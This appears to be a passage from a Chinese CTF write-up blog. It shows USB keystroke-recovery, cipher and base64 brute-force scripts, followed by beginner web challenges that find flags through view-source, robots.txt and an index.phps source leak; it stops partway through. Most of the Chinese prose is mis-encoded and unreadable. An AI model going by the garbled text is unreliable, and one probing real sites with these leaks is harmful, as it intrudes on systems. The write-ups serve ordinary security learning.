class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nums = []</span><br><span class="line">keys = open(<span class="string">&#x27;usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> len(line)!=<span class="number">17</span>: <span class="comment">#é¦–å…ˆè¿‡æ»¤æ‰é¼ æ ‡ç­‰å…¶ä»–è®¾å¤‡çš„USBæµé‡</span></span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(line[<span class="number">0</span>:<span class="number">2</span>]+line[<span class="number">4</span>:<span class="number">6</span>]) <span class="comment">#å–ä¸€ã€ä¸‰å­—èŠ‚</span></span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n[<span class="number">2</span>:<span class="number">4</span>] == <span class="string">&quot;00&quot;</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> n[<span class="number">2</span>:<span class="number">4</span>] <span class="keyword">in</span> normalKeys:</span><br><span class="line">        <span class="keyword">if</span> n[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">&quot;02&quot;</span>: <span class="comment">#è¡¨ç¤ºæŒ‰ä¸‹äº†shift</span></span><br><span class="line">            output += shiftKeys [n[<span class="number">2</span>:<span class="number">4</span>]]</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            output += normalKeys [n[<span class="number">2</span>:<span class="number">4</span>]]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line">print(<span class="string">&#x27;output :n&#x27;</span> + output)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/FJ%5D%5DSIP820Z38BUQ%24OKKU%60H.png" alt=""><br>
äºæ˜¯è¿›è¡Œåˆ†æ<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/%5B_%605WJHV1%6091LCHFTES1C_G.png" alt=""><br>
å›å¤´å†çœ‹çœ‹ï¼Œæœ‰ä¸€ä¸ªæè¿°.txtï¼Œåœ¨è¿™é‡Œå‘ç°ä¸€æ®µæ–‡å­—<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/WO%29V3VDRL0F%24N%40ES2C%5D%7BPSA.png" alt=""><br>
æ„æ€æ˜¯è¢«åˆ é™¤çš„æ‰æ˜¯é‡è¦çš„ï¼Œä¹Ÿå°±æ˜¯è¢«delçš„æ‰æ˜¯key<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/7J_%28IGI913~XQX3BPW%5B%24~ZJ.png" alt=""><br>
äºæ˜¯å»è§£å¯†ä¸€ä¸‹ï¼Œç½‘å€é“¾æ¥ï¼š<code>https://www.dcode.fr/beaufort-cipher</code><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/VW22RQQV%28E%246LMS%5BJPP%25H42.png" alt=""><br>
å¾—åˆ°å‹ç¼©åŒ…å¯†ç ä¸ºï¼šhappyeverydayï¼Œæ‰“å¼€å‹ç¼©åŒ…ï¼Œå¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/VFAE%28U0%24~EF%25%7D~%29OH~JQ~_3.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bugku&#123;What_a_enjoyable_music&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æŠ„é”™çš„å­—ç¬¦"><a class="header-anchor" href="#æŠ„é”™çš„å­—ç¬¦">Â¶</a>æŠ„é”™çš„å­—ç¬¦</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">é¢˜ç›®ï¼š</span><br><span class="line">è€å¸ˆè®©å°æ˜æŠ„å†™ä¸€æ®µè¯ï¼Œç»“æœç²—å¿ƒçš„å°æ˜æŠŠéƒ¨åˆ†æ•°å­—æŠ„æˆäº†å­—æ¯ï¼Œè¿˜å› ä¸ºå¼ºè¿«ç—‡æŠŠæ‰€æœ‰å­—æ¯éƒ½æ¢æˆå¤§å†™ã€‚ä½ èƒ½å¸®å°æ˜æ¢å¤å¹¶è§£å¼€ç­”æ¡ˆå—ï¼šQWIHBLGZZXJSXZNVBZW</span><br></pre></td></tr></table></figure>
<p>æ ¹æ®æç¤ºï¼Œæœ‰äº›æ•°å­—è¢«æ›¿æ¢æˆäº†å­—æ¯ï¼Œç„¶åæ‰€æœ‰å­—æ¯éƒ½è¢«æ›¿æ¢æˆäº†å¤§å†™å­—æ¯ï¼Œå¯†æ–‡æ˜¯ï¼šQWIHBLGZZXJSXZNVBZW</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">çœ‹äº†ä¸€ä¸‹å¯†æ–‡ï¼Œè¢«è®¤é”™çš„å­—æ¯å¤§æ¦‚ç‡æ˜¯Z-2,S-5,B-8,G-9,I-1è¿™äº›</span><br></pre></td></tr></table></figure>
<p>ä¸€å¼€å§‹æˆ‘æ˜¯æ‰‹æ’¸å‡ºæ¥çš„ï¼Œåˆ†æ®µè§£å…¶å®æŒºå¿«çš„ï¼Œæˆ‘ç”¨äº†åŠä¸ªå°æ—¶å·¦å³ï¼Œæ–¹æ³•å°±æ˜¯æ¯4ä¸ªä¸ºä¸€ä½è¿›è¡Œè§£å¯†ï¼Œè¿™é‡Œå…ˆæ”¾å½“æ—¶æ‰‹è§£çš„å›¾ç‰‡<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E6%8A%84%E9%94%99%E7%9A%84%E5%AD%97%E7%AC%A6/%24%5D%28%60Y1L%7B2O%40U4AVI%4082OT%40D.png" alt=""><br>
åæ¥å’Œå¦ä¸€ä½å¸ˆå‚…æ²Ÿé€šæƒ³å†™ä¸ªå¤šçº¿ç¨‹çˆ†ç ´çš„ï¼Œä½†æ²¡å†™æˆåŠŸå“ˆå“ˆ(å¤ªèœäº†)ï¼Œè¿™é‡Œè´´ä¸€ä¸‹æ— è„‘çˆ†ç ´çš„è„šæœ¬å§</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Author: dota_st</span></span><br><span class="line"><span class="string">Date: 2021-02-12 18:16:06</span></span><br><span class="line"><span class="string">blog: www.wlhhlc.top</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getallerrorPossible</span>(<span class="params">S, e</span>):</span></span><br><span class="line">    err = e</span><br><span class="line">    r = [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> S:</span><br><span class="line">        <span class="keyword">if</span> s <span class="keyword">not</span> <span class="keyword">in</span> err:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(r)):</span><br><span class="line">                r[i] += s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(r)):</span><br><span class="line">                tmp = r[i]</span><br><span class="line">                <span class="keyword">if</span> s == <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">                    r[i] += s</span><br><span class="line">                    r.append(tmp + <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">                <span class="keyword">elif</span> s == <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">                    r[i] += s</span><br><span class="line">                    r.append(tmp + <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">                <span class="keyword">elif</span> s == <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">                    r[i] += s</span><br><span class="line">                    r.append(tmp + <span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">                <span class="keyword">elif</span> s == <span class="string">&#x27;G&#x27;</span>:</span><br><span class="line">                    r[i] += s</span><br><span class="line">                    r.append(tmp + <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">                <span class="keyword">elif</span> s == <span class="string">&#x27;I&#x27;</span>:</span><br><span class="line">                    r[i] += s</span><br><span class="line">                    r.append(tmp + <span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">                    r.append(tmp + <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">letterCasePermutation</span>(<span class="params">S</span>):</span></span><br><span class="line">    res = [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> S:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s.isalpha():</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)):</span><br><span class="line">                res[i] += s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)):</span><br><span class="line">                tmp = res[i]</span><br><span class="line">                res[i] += s.lower()</span><br><span class="line">                res.append(tmp + s.upper())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_fun</span>(<span class="params">list, delete_list</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> any(i <span class="keyword">in</span> list <span class="keyword">for</span> i <span class="keyword">in</span> delete_list) <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    err = <span class="string">&#x27;ZSBGI&#x27;</span></span><br><span class="line">    s2 = <span class="string">&#x27;QW1hbIGZZXJSXZNVBZW=&#x27;</span></span><br><span class="line">    ap = getallerrorPossible(s2, err)</span><br><span class="line">    delete = [<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;Å“&#x27;</span>]<span class="comment">#å‰”é™¤åŒ…å«è¿™äº›å­—ç¬¦çš„æƒ…å†µ</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> ap:</span><br><span class="line">        r = letterCasePermutation(s)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> r:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f = base64.b64decode(i).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> f.isprintable() <span class="keyword">and</span> <span class="keyword">not</span> delete_fun(f, delete):</span><br><span class="line">                    res.append(f)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">        print(i)</span><br><span class="line">    print(<span class="string">&quot;[*]ä¸€å…±è§£å‡º&#123;0&#125;ä¸ª&quot;</span>.format(len(res)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œå<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E6%8A%84%E9%94%99%E7%9A%84%E5%AD%97%E7%AC%A6/6YEQDS6CN0TBVR%28VC~666HM.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;Aman_very_cool&#125;</span><br></pre></td></tr></table></figure>
<h3 id="é»„é“åäºŒå®«"><a class="header-anchor" href="#é»„é“åäºŒå®«">Â¶</a>é»„é“åäºŒå®«</h3>
<p>é¢˜ç›®æ¥æºäºæœ€è¿‘è¢«ç ´è§£çš„åäºŒå®«æ€æ‰‹å¯†ç ï¼Œä¹Ÿæ˜¯æœ€è¿‘iæ˜¥ç§‹å‡ºçš„åŸé¢˜ï¼Œåªæ˜¯é‡Œé¢ä¸€äº›å­—ç¬¦è¢«æ”¹åŠ¨äº†<br>
æœ‰å…´è¶£çš„å¯ä»¥å»äº†è§£è¿™ä¸ªæ•…äº‹ï¼š<a href="https://www.sohu.com/a/437973880_610300">https://www.sohu.com/a/437973880_610300</a><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB/QBL%24HSS%24Q6VGB_%5BU31AVT7L.png" alt=""><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB/R5FG%249_4LUP%7D%5D~06VTT%29%24%7BH.png" alt=""><br>
é¦–å…ˆæˆ‘ä»¬å…ˆæŠŠå›¾ç‰‡çš„å†…å®¹æŠ„ä¸‹æ¥<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB/%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%98.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%,,@*&gt;@?&#x3D;&#x3D;%88%5</span><br><span class="line">,@%#@@90-7$^&#x3D;*@</span><br><span class="line">17,(&gt;()1@##-$40</span><br><span class="line">~,*6?#%#8#&#x3D;75+1</span><br><span class="line">(*@*1%#&gt;,0@5)%?</span><br><span class="line">%*^&#x3D;)&amp;&gt;&#x3D;1%,+7&amp;#</span><br><span class="line">8681(+8*@@(,@@@</span><br><span class="line">#*&#x3D;#$3*#%,#%%,3</span><br><span class="line">,*+7,7+@&#x3D;&#x3D;&#x3D;+)61</span><br></pre></td></tr></table></figure>
<p>ç„¶åç”¨è„šæœ¬è¿›è¡Œæ’åˆ—</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1=<span class="string">r&#x27;%,,@*&gt;@?==%88%5&#x27;</span>*<span class="number">9</span></span><br><span class="line">s2=<span class="string">r&#x27;,@%#@@90-7$^=*@&#x27;</span>*<span class="number">9</span></span><br><span class="line">s3=<span class="string">r&#x27;17,(&gt;()1@##-$40&#x27;</span>*<span class="number">9</span></span><br><span class="line">s4=<span class="string">r&#x27;~,*6?#%#8#=75+1&#x27;</span>*<span class="number">9</span></span><br><span class="line">s5=<span class="string">r&#x27;(*@*1%#&gt;,0@5)%?&#x27;</span>*<span class="number">9</span></span><br><span class="line">s6=<span class="string">r&#x27;%*^=)&amp;&gt;=1%,+7&amp;#&#x27;</span>*<span class="number">9</span></span><br><span class="line">s7=<span class="string">r&#x27;8681(+8*@@(,@@@&#x27;</span>*<span class="number">9</span></span><br><span class="line">s8=<span class="string">r&#x27;#*=#$3*#%,#%%,3&#x27;</span>*<span class="number">9</span></span><br><span class="line">s9=<span class="string">r&#x27;,*+7,7+@===+)61&#x27;</span>*<span class="number">9</span></span><br><span class="line"></span><br><span class="line">tmp=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">    tmp += s1[i]+s2[i+<span class="number">2</span>]+s3[i+<span class="number">4</span>]+s4[i+<span class="number">6</span>]+s5[i+<span class="number">8</span>]+s6[i+<span class="number">10</span>]+s7[i+<span class="number">12</span>]+s8[i+<span class="number">14</span>]+s9[i+<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cut</span>(<span class="params">obj, sec</span>):</span></span><br><span class="line">    str_list = [obj[i:i+sec] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(obj),sec)]</span><br><span class="line">    print(str_list)</span><br><span class="line">    <span class="keyword">return</span> str_list</span><br><span class="line"></span><br><span class="line">l1=cut(tmp,<span class="number">17</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l1:</span><br><span class="line">    <span class="keyword">print</span> (i)</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œåå¾—åˆ°æ’åˆ—ç»“æœ<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB/%25YO58T43%4034M%5D_24E72I%7BCF.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%%&gt;%,,@3*,#(#0+@#</span><br><span class="line">+,@)8@7@*7@@1#5&amp;8</span><br><span class="line">&#x3D;,*9@&#x3D;)#6#7&gt;0#7%%</span><br><span class="line">8$+@-#5?*13@?7-+(</span><br><span class="line">^(*&#x3D;&#x3D;$$1*&#x3D;+#&#x3D;&#x3D;^4~</span><br><span class="line">@)8%&#x3D;%&#x3D;0,*&amp;*,+8*1</span><br><span class="line">*1&gt;@#)8@76%&#x3D;@%6%,</span><br><span class="line">,?#1(%15@(#&gt;%,,,%</span><br><span class="line">%&gt;%,,@3*,#(#0+@#+</span><br></pre></td></tr></table></figure>
<p>å†æ”¾å…¥AZdecryptè½¯ä»¶ä¸­è¿è¡Œ<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB/PL%29X0HOGMD%5D%5BAS94%7B_RLLWQ.png" alt=""><br>
çœ‹åˆ°äº†flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;alphananke&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Reverse"><a class="header-anchor" href="#Reverse">Â¶</a>Reverse</h2>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-Web1000é¢˜ç³»åˆ—ä¿®ç‚¼(ä¸€)</title>
    <url>/posts/14827/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€</h2>
<p>è¿™ä¸ªwebç³»åˆ—é¢˜æ˜¯å‰äº›æ—¥å­æˆ‘éšæ„é€›é€›çš„æ—¶å€™ï¼Œåœ¨ctfshowå¹³å°ä¸Šå‘ç°çš„ï¼Œæ­£å¥½webå¤ªèœäº†ï¼Œå€Ÿç”±è¿™ä¸ªç³»åˆ—é¢˜å¼€å§‹è‡ªæˆ‘ä¿®ç‚¼å§ğŸ˜–</p>
<h2 id="ä¿¡æ¯æ”¶é›†-1-20"><a class="header-anchor" href="#ä¿¡æ¯æ”¶é›†-1-20">Â¶</a>ä¿¡æ¯æ”¶é›†(1-20)</h2>
<h3 id="web1"><a class="header-anchor" href="#web1">Â¶</a>web1</h3>
<p>å³é”®æŸ¥çœ‹æºç å°±èƒ½çœ‹åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web1/%24A%60L%5D%280Z%28L%24%5DUO3%60QC03%5B0K.png" alt=""></p>
<h3 id="web2"><a class="header-anchor" href="#web2">Â¶</a>web2</h3>
<p>æ‰“å¼€ç½‘é¡µæç¤ºæ— æ³•æŸ¥çœ‹æºä»£ç ï¼Œå³é”®ä¹Ÿä½¿ç”¨ä¸äº†ï¼Œé‚£æˆ‘ä»¬å°±åœ¨urlå‰é¢åŠ ä¸Š<code>view-source:</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;83a83588-671e-4a94-9c6f-6857f9e20c2f.chall.ctf.show&#x2F;</span><br></pre></td></tr></table></figure>
<p>è®¿é—®åå³å¯è·å¾—flag</p>
<h3 id="web3"><a class="header-anchor" href="#web3">Â¶</a>web3</h3>
<p>å³é”®æºç ä¹Ÿæ²¡çœ‹åˆ°ä¿¡æ¯ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹è¯·æ±‚å¤´å’Œå“åº”å¤´ï¼Œåœ¨å“åº”å¤´è¿™é‡Œæ‰¾åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web3/58CPJ8K6U1MK55EAIOYX6%24D.png" alt=""></p>
<h3 id="web4"><a class="header-anchor" href="#web4">Â¶</a>web4</h3>
<p>é¢˜ç›®æç¤ºrobotsï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥è®¿é—®<code>http://c6f215bf-6c3e-4a21-949b-1c37d603ca56.chall.ctf.show/robots.txt</code><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web4/%28SHD3YCKR5EX_PFSJJJ~%28KT.png" alt=""><br>
ç„¶åæ ¹æ®æç¤ºï¼Œå†è®¿é—®flagishere.txtï¼Œå³å¯å¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web4/8S25%29G2%40%25%7BLSCUTWJL%24FJJ1.png" alt=""></p>
<h3 id="web5"><a class="header-anchor" href="#web5">Â¶</a>web5</h3>
<p>é¢˜ç›®æç¤ºæ˜¯phpsæºç æ³„éœ²ï¼Œäºæ˜¯åœ¨index.phpåé¢åŠ ä¸Šsï¼Œå³æ„é€ urlå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;69ba9522-1aaf-4726-b2df-360c5c88d1ac.chall.ctf.show&#x2F;index.phps</span><br></pre></td></tr></table></figure>
<p>è®¿é—®åå¼¹å‡ºä¸€ä¸ªä¸‹è½½æ–‡ä»¶ï¼Œä¸‹è½½åæ‰“å¼€æ–‡ä»¶å¾—åˆ°flag<br>
